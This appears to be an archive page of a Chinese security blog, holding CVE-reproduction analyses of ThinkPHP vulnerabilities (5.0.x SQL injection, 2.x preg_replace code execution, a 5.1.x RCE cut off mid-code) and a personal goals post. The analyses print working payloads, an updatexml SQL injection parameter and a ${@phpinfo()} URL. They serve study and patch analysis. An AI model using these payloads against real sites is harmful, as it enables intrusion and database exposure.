+      <a data-url="http://blog.ccreater.top/2020/02/01/ThinkPHP6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-id="ck917a7av000au8v0c62uatub" data-title="ThinkPHP6 任意文件操作漏洞分析" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-ThinkPHP框架5.0.x_SQL注入分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/02/01/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/" class="article-date">
+  <time class="dt-published" datetime="2020-02-01T04:53:15.310Z" itemprop="datePublished">2020-02-01</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/02/01/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/">ThinkPHP框架5.0.x_SQL注入分析</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="ThinkPHP框架5-0-x-SQL注入分析-amp-数据库配置泄露"><a href="#ThinkPHP框架5-0-x-SQL注入分析-amp-数据库配置泄露" class="headerlink" title="ThinkPHP框架5.0.x SQL注入分析 &amp; 数据库配置泄露"></a>ThinkPHP框架5.0.x SQL注入分析 &amp; 数据库配置泄露</h1><h2 id="应用范围"><a href="#应用范围" class="headerlink" title="应用范围"></a>应用范围</h2><p>开启debug模式的thinkphp5.0.x</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>从官网上下载5.0.9完整版</p>
+<p><code>application/index/controller/index.php</code>内容如下</p>
+<pre><code class="php">&lt;?php
+namespace app\index\controller;
+
+use app\model\Gather;
+
+class Index
+{
+    public function index()
+    {
+        $ids = input(&#39;ids/a&#39;);
+        $t = db(&quot;user&quot;);
+        $result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();
+
+    }
+}
+</code></pre>
+<p><img src="https://i.loli.net/2020/02/01/8hmETeuW31p5Zb6.png" alt="image460"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们在漏洞的关键位置下个断点进行分析,<code>thinkphp\library\think\db\Builder.php</code>:383行</p>
+<p>调用堆栈为:</p>
+<p><img src="https://i.loli.net/2020/02/01/YFfV74U8cxTLS2H.png" alt="image609"></p>
+<p>从index()方法开始</p>
+<pre><code class="php">public function index()
+    {
+        $ids = input(&#39;ids/a&#39;);
+        $t = db(&quot;user&quot;);
+        $result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();
+
+    }</code></pre>
+<p>调用<code>$t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)</code>返回值的select()方法</p>
+<p>我们先看下select()方法,它会将<code>$option</code>作为参数调用<code>Builder::select</code>方法</p>
+<pre><code class="php">public function select($data = null)
+    {
+        ...
+
+        // 分析查询表达式
+        $options = $this-&gt;parseExpress();
+
+        ...
+        if (!$resultSet) {
+            // 生成查询SQL
+            $sql = $this-&gt;builder-&gt;select($options);
+            // 获取参数绑定
+            ...
+            }
+
+            ...
+
+    }</code></pre>
+<p>我们跟进<code>$this-&gt;parseExpress();</code>看<code>$option</code>是如何生成的</p>
+<pre><code class="php">protected function parseExpress()
+    {
+        $options = $this-&gt;options;
+        ...
+    }</code></pre>
+<p>这里是直接令<code>$options = $this-&gt;options;</code>,而<code>$this-&gt;options</code>是<code>$t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)</code>过程生成的</p>
+<p>跟进去发现有这一条语句 <code>$this-&gt;options[&#39;where&#39;][$logic] = array_merge($this-&gt;options[&#39;where&#39;][$logic], $where);</code>,其中<code>$where</code>由<code>$where[$field] = [$op, $condition, isset($param[2]) ? $param[2] : null];</code>得到</p>
+<p>获得<code>$option</code>的调用链为:</p>
+<p><code>$result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();</code> ( <code>public function where($field, $op = null, $condition = null)</code> ) =&gt; <code>$this-&gt;parseWhereExp(&#39;AND&#39;, $field, $op, $condition, $param);</code>  =&gt; <code>$where[$field] = [$op, $condition, isset($param[2]) ? $param[2] : null];</code> </p>
+<p>我们回到<code>$this-&gt;builder-&gt;select($options);</code>,现在我们知道<code>$this-&gt;options[&#39;where&#39;][$logic]</code>是我们的可控位置</p>
+<p>跟进去</p>
+<pre><code class="php">public function select($options = [])
+    {
+        $sql = str_replace(
+            [&#39;%TABLE%&#39;, &#39;%DISTINCT%&#39;, &#39;%FIELD%&#39;, &#39;%JOIN%&#39;, &#39;%WHERE%&#39;, &#39;%GROUP%&#39;, &#39;%HAVING%&#39;, &#39;%ORDER%&#39;, &#39;%LIMIT%&#39;, &#39;%UNION%&#39;, &#39;%LOCK%&#39;, &#39;%COMMENT%&#39;, &#39;%FORCE%&#39;],
+            [
+                $this-&gt;parseTable($options[&#39;table&#39;], $options),
+                $this-&gt;parseDistinct($options[&#39;distinct&#39;]),
+                $this-&gt;parseField($options[&#39;field&#39;], $options),
+                $this-&gt;parseJoin($options[&#39;join&#39;], $options),
+                $this-&gt;parseWhere($options[&#39;where&#39;], $options),
+                $this-&gt;parseGroup($options[&#39;group&#39;]),
+                $this-&gt;parseHaving($options[&#39;having&#39;]),
+                $this-&gt;parseOrder($options[&#39;order&#39;], $options),
+                $this-&gt;parseLimit($options[&#39;limit&#39;]),
+                $this-&gt;parseUnion($options[&#39;union&#39;]),
+                $this-&gt;parseLock($options[&#39;lock&#39;]),
+                $this-&gt;parseComment($options[&#39;comment&#39;]),
+                $this-&gt;parseForce($options[&#39;force&#39;]),
+            ], $this-&gt;selectSql);
+        return $sql;
+    }</code></pre>
+<p>这个<code>$this-&gt;parseWhere($options[&#39;where&#39;], $options)</code>分支进入了关键的漏洞位置,此时<code>$where</code>可控</p>
+<pre><code class="php">protected function parseWhere($where, $options)
+    {
+        $whereStr = $this-&gt;buildWhere($where, $options);
+        ...
+        return empty($whereStr) ? &#39;&#39; : &#39; WHERE &#39; . $whereStr;
+    }</code></pre>
+<p>再跟进<code>$this-&gt;buildWhere($where, $options)</code>,此时<code>$where</code>可控</p>
+<pre><code class="php">public function buildWhere($where, $options)
+    {
+        if (empty($where)) {
+            $where = [];
+        }
+
+        if ($where instanceof Query) {
+            return $this-&gt;buildWhere($where-&gt;getOptions(&#39;where&#39;), $options);
+        }
+
+        $whereStr = &#39;&#39;;
+        $binds    = $this-&gt;query-&gt;getFieldsBind($options[&#39;table&#39;]);
+        foreach ($where as $key =&gt; $val) {
+            $str = [];
+            foreach ($val as $field =&gt; $value) {
+                ...
+                    // 对字段使用表达式查询
+                    $field = is_string($field) ? $field : &#39;&#39;;
+                    $str[] = &#39; &#39; . $key . &#39; &#39; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);
+
+            }
+
+            $whereStr .= empty($whereStr) ? substr(implode(&#39; &#39;, $str), strlen($key) + 1) : implode(&#39; &#39;, $str);
+        }
+
+        return $whereStr;
+    }</code></pre>
+<p><code>$whereStr .= empty($whereStr) ? substr(implode(&#39; &#39;, $str), strlen($key) + 1) : implode(&#39; &#39;, $str);</code>这个生成了sql语句的where部分,其中<code>$str</code>是由<code>$str[] = &#39; &#39; . $key . &#39; &#39; . $this-&gt;parseWhereItem($field, $value, $key, $options, $binds);</code>生成的,而参数<code>$value[1]</code>就是我们<code>ids[1,updatexml(0,concat(0x7e,(database()),0x7e),1)]=123%23</code>payload中的键值</p>
+<p>跟进<code>$this-&gt;parseWhereItem($field, $value, $key, $options, $binds);</code></p>
+<pre><code class="php">protected function parseWhereItem($field, $val, $rule = &#39;&#39;, $options = [], $binds = [], $bindName = null)
+    {
+        $key = $field ? $this-&gt;parseKey($field, $options) : &#39;&#39;;
+
+        // 查询规则和条件
+        if (!is_array($val)) {
+            $val = [&#39;=&#39;, $val];
+        }
+        list($exp, $value) = $val;
+        // 字段分析
+        if(....){
+            ...
+        } elseif (in_array($exp, [&#39;NOT IN&#39;, &#39;IN&#39;])) {
+            // IN 查询
+            if ($value instanceof \Closure) {
+                $whereStr .= $key . &#39; &#39; . $exp . &#39; &#39; . $this-&gt;parseClosure($value);
+            } else {
+                $value = is_array($value) ? $value : explode(&#39;,&#39;, $value);
+                if (array_key_exists($field, $binds)) {
+                    $bind  = [];
+                    $array = [];
+                    foreach ($value as $k =&gt; $v) {
+                        if ($this-&gt;query-&gt;isBind($bindName . &#39;_in_&#39; . $k)) {
+                            $bindKey = $bindName . &#39;_in_&#39; . uniqid() . &#39;_&#39; . $k;
+                        } else {
+                            $bindKey = $bindName . &#39;_in_&#39; . $k;
+                        }
+                        $bind[$bindKey] = [$v, $bindType];
+                        $array[]        = &#39;:&#39; . $bindKey;
+                    }
+                    $this-&gt;query-&gt;bind($bind);
+                    $zone = implode(&#39;,&#39;, $array);
+                } else {
+                    $zone = implode(&#39;,&#39;, $this-&gt;parseValue($value, $field));
+                }
+                $whereStr .= $key . &#39; &#39; . $exp . &#39; (&#39; . (empty($zone) ? &quot;&#39;&#39;&quot; : $zone) . &#39;)&#39;;
+            }
+        } 
+        return $whereStr;
+    }</code></pre>
+<p>然后我们可以看到当<code>in_array($exp, [&#39;NOT IN&#39;, &#39;IN&#39;])</code>条件满足时,将会直接将我们payload中的键值直接拼接到sql语句中</p>
+<pre><code class="php">                foreach ($value as $k =&gt; $v) {
+                        if ($this-&gt;query-&gt;isBind($bindName . &#39;_in_&#39; . $k)) {
+                            $bindKey = $bindName . &#39;_in_&#39; . uniqid() . &#39;_&#39; . $k;
+                        } else {
+                            $bindKey = $bindName . &#39;_in_&#39; . $k;
+                        }
+                        $bind[$bindKey] = [$v, $bindType];
+                        $array[]        = &#39;:&#39; . $bindKey;
+                    }</code></pre>
+<p>而<code>$exp</code>则由<code>$result = $t-&gt;where(&#39;id&#39;, &#39;in&#39;, $ids)-&gt;select();</code>中的<code>&#39;in&#39;</code>经过一系列操作后得到</p>
+<p>但是这里只能进行没有子查询语句的sql报错注入</p>
+<p>如果有子查询语句的话就会报<code>SQLSTATE[HY000]: General error: 1105 Only constant XPATH queries are supported</code>的错误</p>
+<p>所以这个sql注入有点不行,但时sql报错会暴露数据库配置却是非常有用的</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://zerokeeper.com/vul-analysis/thinkphp-framework-50x-sql-injection-analysis.html" target="_blank" rel="noopener">https://zerokeeper.com/vul-analysis/thinkphp-framework-50x-sql-injection-analysis.html</a> </p>
+<p> <a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a> </p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/01/ThinkPHP框架5.0.x_SQL注入分析/">http://blog.ccreater.top/2020/02/01/ThinkPHP框架5.0.x_SQL注入分析/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/02/01/ThinkPHP%E6%A1%86%E6%9E%B65.0.x_SQL%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/" data-id="ck917a7b9000tu8v0hlul7ymn" data-title="ThinkPHP框架5.0.x_SQL注入分析" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-我的2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/01/31/%E6%88%91%E7%9A%842020/" class="article-date">
+  <time class="dt-published" datetime="2020-01-31T15:11:23.717Z" itemprop="datePublished">2020-01-31</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%9D%82/">杂</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/01/31/%E6%88%91%E7%9A%842020/">我的2020</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="我的2020"><a href="#我的2020" class="headerlink" title="我的2020"></a>我的2020</h1><h2 id="这个是啥"><a href="#这个是啥" class="headerlink" title="这个是啥"></a>这个是啥</h2><p>这是一个目标清单,来记录我2020年想要完成的事情.</p>
+<h2 id="写这个的原因"><a href="#写这个的原因" class="headerlink" title="写这个的原因"></a>写这个的原因</h2><p><strong>我想要在大学毕业后,很自然的认为:我的大学是充实的,是我每一天认认真真的走过去的.我可以自豪的承认自己的优秀</strong></p>
+<p><img src="https://i.loli.net/2020/01/31/7OHm9wbEsVYgfd3.png" alt="image173"></p>
+<p>我想要变得更加优秀,我想活出自己</p>
+<h2 id="如何更新-更新规则"><a href="#如何更新-更新规则" class="headerlink" title="如何更新/更新规则"></a>如何更新/更新规则</h2><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
+<li>目标是清晰明确的,量化的</li>
+<li>目标难度要适合,不能太简单也不能不可实现</li>
+<li>如果无法确定今年的目标,那就确定这个月的吧</li>
+<li>根据实际情况对目标进行调整</li>
+<li>从自己所能想到的最远的地方(目标/梦想/想法)开始制定目标</li>
+</ol>
+<h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><ol>
+<li>举例:我要好好学习(x); 我要学习编程方面的知识,达到能够独立编写自己的博客系统(√)</li>
+<li>太简单的目标有必要制定吗,无法实现的目标有必要写下来吗.难度适合的目标可以给予自己一种正反馈,使自己更有信心实现目标,并能从中获取乐趣</li>
+<li>行动是有目的的，而从高到低，从整体到局部，会让你清晰的认识到你现在要怎么做，为什么要这么做，你未来的路在何方会更加清晰，如果某个地方你想不出来，那就缩小范围，你无法考虑你人生的目的，但你可以思考未来10年的方向，可能未来十年也太难下定论，未来一年，一个月，一星期却是可以的。 </li>
+<li>因为周围的变化,对目标的不了解等等因素导致可能会制定过难/过易/没有意义的目标,所以要根据实际情况进行调整(不是叫我偷懒哦)</li>
+<li>小目标永远是为大目标/梦想/想法服务的</li>
+</ol>
+<h2 id="将目标转为计划的规则"><a href="#将目标转为计划的规则" class="headerlink" title="将目标转为计划的规则"></a>将目标转为计划的规则</h2><ol>
+<li>分解细致，能力可达，留有余地</li>
+<li>奖惩并行</li>
+<li>每个星期总结一次,计划是否合理</li>
+</ol>
+<h2 id="所能想到的最远的目标-想法-梦想"><a href="#所能想到的最远的目标-想法-梦想" class="headerlink" title="所能想到的最远的目标/想法/梦想"></a>所能想到的最远的目标/想法/梦想</h2><ol>
+<li>在自己热爱的事业上获得可观的收入,成为优秀的白帽子</li>
+<li>身体健康,三观尚在 </li>
+<li>开发一个类似hexo的python程序</li>
+<li>进入补天前1000名</li>
+</ol>
+<h2 id="具体内容"><a href="#具体内容" class="headerlink" title="具体内容"></a>具体内容</h2><h3 id="奖惩规则"><a href="#奖惩规则" class="headerlink" title="奖惩规则"></a>奖惩规则</h3><p>时间分为三种:专注时间,自由时间,杂;不得不干且并非在计划中且没有干其他不是不得不干的事情的时间称为:杂</p>
+<ol>
+<li>每专注于目标2个小时就可以任意支配1个小时的时间</li>
+<li>专注过程中跑去玩,从头来过,计时清零</li>
+<li>没有认真执行,销毁这份计划</li>
+</ol>
+<h3 id="寒假"><a href="#寒假" class="headerlink" title="寒假"></a>寒假</h3><p>寒假期间延迟到2.22(不改我完成不了拉)</p>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> 寒假期间补天挖洞获得18个库币(买这个 <a href="https://www.butian.net/Shop/detail/?id=700399" target="_blank" rel="noopener">https://www.butian.net/Shop/detail/?id=700399</a> )</li>
+<li><input disabled="" type="checkbox"> 寒假期间复现30个cve(13/30)  , 失败,后面就开始放纵自己呢</li>
+<li><input disabled="" type="checkbox"> 寒假期间代码审计一个小cms,找出尽可能多的漏洞 ,失败</li>
+<li><input checked="" disabled="" type="checkbox"> 寒假看完码农翻身(1/3)</li>
+</ul>
+<h3 id="3月份"><a href="#3月份" class="headerlink" title="3月份"></a>3月份</h3><p>3.11-3.31</p>
+<ul>
+<li><input disabled="" type="checkbox"> 复现20个cve(0/20)</li>
+<li><input disabled="" type="checkbox"> 看完一本书(未定)</li>
+<li><input checked="" disabled="" type="checkbox"> 看完那本linux书籍</li>
+<li><input disabled="" type="checkbox"> buuoj40题(8/40)</li>
+<li><input disabled="" type="checkbox"> 再挖出20个库币</li>
+</ul>
+<h3 id="4月份"><a href="#4月份" class="headerlink" title="4月份"></a>4月份</h3><ul>
+<li><input disabled="" type="checkbox"> 复现30个cve(5/30)</li>
+<li><input disabled="" type="checkbox"> 看完一本书(明朝那些事)</li>
+<li><input disabled="" type="checkbox"> buuoj50题(20/50)</li>
+<li><input disabled="" type="checkbox"> 挖20个库币</li>
+<li><input disabled="" type="checkbox"> 我的世界写一个mod</li>
+</ul>
+<h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><h3 id="寒假-1"><a href="#寒假-1" class="headerlink" title="寒假"></a>寒假</h3><p>前期做的挺好的,后面因为没有计划/不太会制定计划,就越来越浪</p>
+<h3 id="3月份-1"><a href="#3月份-1" class="headerlink" title="3月份"></a>3月份</h3><p>3月份是真的彻底摸鱼过去,浑浑噩噩没有目标没有计划,但是有很多借口</p>
+<p>最常用的是:我要找到我热爱的目标,哪有什么东西能让你在整个过程一直热爱,过程必然辛苦,这也是最后实现时快乐的燃料,不过换一种思考角度就有可能不觉得辛苦了</p>
+<p>总结:选择一个目标,严格要求自己,记录下每天所做的事情</p>
+<h2 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h2><p>最近又被没有理想和目标所困扰,到底是我没有还是我不想有,反正最近是挺无聊的.多看点书,多思考一下吧</p>
+<p>我要找到我热爱的目标,哪有什么东西能让你在整个过程一直热爱,过程必然辛苦,这也是最后实现时快乐的燃料,不过换一种思考角度就有可能不觉得辛苦了</p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/01/31/我的2020/">http://blog.ccreater.top/2020/01/31/我的2020/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/01/31/%E6%88%91%E7%9A%842020/" data-id="ck917a7d4003eu8v0ei0pf4ok" data-title="我的2020" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-ThinkPHP 2.x任意代码执行漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/01/30/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time class="dt-published" datetime="2020-01-30T13:13:11.056Z" itemprop="datePublished">2020-01-30</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/01/30/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">ThinkPHP 2.x任意代码执行漏洞</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="ThinkPHP-2-x任意代码执行漏洞"><a href="#ThinkPHP-2-x任意代码执行漏洞" class="headerlink" title="ThinkPHP 2.x任意代码执行漏洞"></a>ThinkPHP 2.x任意代码执行漏洞</h1><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>thinkphp 2.1</p>
+<p>官网的thinkphp 2.2已经修复了</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞位置</p>
+<p><img src="https://i.loli.net/2020/01/30/8UW5mxvARaoFlPX.png" alt="image154"></p>
+<p>路由解析处</p>
+<p><code>$res = preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, implode($depr,$paths));</code></p>
+<p>这个preg_replace有点古怪,没有用<code>/</code>来包围搜索模式而是用<code>@</code>,查找关于preg的文档发现</p>
+<blockquote>
+<p>当使用 PCRE 函数的时候，模式需要由<em>分隔符</em>闭合包裹。分隔符可以使任意非字母数字、非反斜线、非空白字符。   </p>
+<p> 经常使用的分隔符是正斜线(<em>/</em>)、hash符号(<em>#</em>)   以及取反符号(<em>~</em>)。下面的例子都是使用合法分隔符的模式。    </p>
+<pre><code>/foo bar/
+#^[^0-9]$#
++php+
+%[a-zA-Z0-9_-]%</code></pre></blockquote>
+<p>替换常量,这个就变成了</p>
+<p><code>preg_replace(&#39;@(\w+)/([^\/\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, implode(&#39;/&#39;,$paths));</code></p>
+<p>查看preg_replace的介绍发现</p>
+<blockquote>
+<p>当使用被弃用的 e 修饰符时, 这个函数会转义一些字符(即：’、”、 \ 和 NULL) 然后进行后向引用替换。当这些完成后请确保后向引用解析完后没有单引号或双引号引起的语法错误(比如： ‘strlen(&#39;$1&#39;)+strlen(“$2”)’)。确保符合PHP的 字符串语法，并且符合eval语法。因为在完成替换后，引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串。 </p>
+</blockquote>
+<p>执行<code>$replacement</code>(第二个参数)前,会先替换掉引用</p>
+<p>我们可以看到,<code>$replacement</code>用双引号来包围引用<code>\\2</code>,会导致命令执行</p>
+<p>构造</p>
+<pre><code class="php">$paths=array(
+    &#39;xxxx&#39;,
+    &#39;${phpinfo()}&#39;
+);</code></pre>
+<p>则<code>&#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;</code>变为<code>$var[&#39;xxxx&#39;]=&quot;${phpinfo()}&quot;;</code></p>
+<p>从而导致命令执行</p>
+<p>于是构造payload</p>
+<p><code>[http://127.0.0.1/public/index.php?s=/index/index/name/$%7B@phpinfo()%7D](http://127.0.0.1/public/index.php?s=/index/index/name/${@phpinfo()})</code></p>
+<h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p><img src="https://i.loli.net/2020/01/30/9AlHbyKzaBOJXnR.png" alt="image1293"></p>
+<p>用单引号来包围所有引用就可以避免命令执行</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a href="https://github.com/vulhub/vulhub/tree/master/thinkphp/2-rce" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/thinkphp/2-rce</a> </p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="http://blog.ccreater.top/2020/01/30/ThinkPHP">http://blog.ccreater.top/2020/01/30/ThinkPHP</a> 2.x任意代码执行漏洞/](<a href="http://blog.ccreater.top/2020/01/30/ThinkPHP">http://blog.ccreater.top/2020/01/30/ThinkPHP</a> 2.x任意代码执行漏洞/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/01/30/ThinkPHP%202.x%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ck917a7at0006u8v0g0f6dr2i" data-title="ThinkPHP 2.x任意代码执行漏洞" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/01/30/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="article-date">
+  <time class="dt-published" datetime="2020-01-30T07:35:28.184Z" itemprop="datePublished">2020-01-30</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/01/30/ThinkPHP%205.1.x-5.2.x%E5%85%A8%E7%89%88%E6%9C%ACRCE%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="ThinkPHP-5-1-x-5-2-x全版本RCE-漏洞分析"><a href="#ThinkPHP-5-1-x-5-2-x全版本RCE-漏洞分析" class="headerlink" title="ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析"></a>ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析</h1><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>5.1.x-5.1.32  5.2.x(这个还没去看)</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>补丁: <a href="https://github.com/top-think/framework/commit/2454cebcdb6c12b352ac0acd4a4e6b25b31982e6" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/2454cebcdb6c12b352ac0acd4a4e6b25b31982e6</a> </p>
+<p>测试环境 5.1.29</p>
+<p><strong>入口处关闭报错</strong> </p>
+<p><img src="https://i.loli.net/2020/01/30/2x4QWZYgmXjqo8r.png" alt="image283"></p>
+<p>和5.0.x版本的漏洞有着相似之处,都是<code>$this-&gt;method</code>方法未过滤导致的任意变量覆盖,从而导致命令执行</p>
+<p>通过<code>$_POST[&#39;_method&#39;]=xxxxx</code>来进行任意变量覆盖</p>
+<p>我们选择覆盖<code>$this-&gt;filter</code>,翻找Request类中的函数发现还是<code>Request::input</code>处可以命令执行,下断点可以看到调用堆栈</p>
+<p><img src="https://i.loli.net/2020/01/30/dVyPeZHbYM3TFq7.png" alt="image527"></p>
+<p>我们从<code>Request::param</code>处开始分析</p>
+<pre><code class="php">public function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
+    {
+        if (!$this-&gt;mergeParam) {
+            $method = $this-&gt;method(true);
+
+            // 自动获取请求变量
+            switch ($method) {
+                case &#39;POST&#39;:
+                    $vars = $this-&gt;post(false);
+                    break;
+                case &#39;PUT&#39;:
+                case &#39;DELETE&#39;:
+                case &#39;PATCH&#39;:
+                    $vars = $this-&gt;put(false);
+                    break;
+                default:
+                    $vars = [];
+            }
+
+            // 当前请求参数和URL地址中的参数合并
+            $this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));
+
+            $this-&gt;mergeParam = true;
+        }
+
+        ...
+    }</code></pre>
+<p>因为是POST请求所以会进入POST分支,跟进<code>Request::post</code></p>
+<pre><code class="php">    public function post($name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
+    {
+        if (empty($this-&gt;post)) {
+            $this-&gt;post = !empty($_POST) ? $_POST : $this-&gt;getInputData($this-&gt;input);
+        }
+
+        return $this-&gt;input($this-&gt;post, $name, $default, $filter);
+    }</code></pre>
+<p>接着便会调用<code>Request::input</code>,其中<code>$this-&gt;post</code>和<code>$filter</code>可控</p>
+<p>跟进<code>Request::input</code></p>
+<pre><code class="php">public function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;)
+    {
+        ...
+
+        // 解析过滤器
+        $filter = $this-&gt;getFilter($filter, $default);
+
+        if (is_array($data)) {
